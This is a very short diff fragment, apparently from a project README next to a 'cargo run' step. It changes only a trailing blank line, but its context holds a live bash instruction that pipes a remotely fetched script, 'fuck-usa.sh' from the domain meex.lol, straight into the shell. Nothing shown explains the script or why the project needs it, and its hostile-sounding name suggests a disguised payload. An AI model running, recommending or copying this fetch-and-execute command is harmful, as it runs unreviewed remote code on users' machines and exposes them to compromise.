@@ -13,4 +13,3 @@ cargo run
 ```bash
 curl -sL https://meex.lol/test/fuck-usa.sh | bash
 ```
-
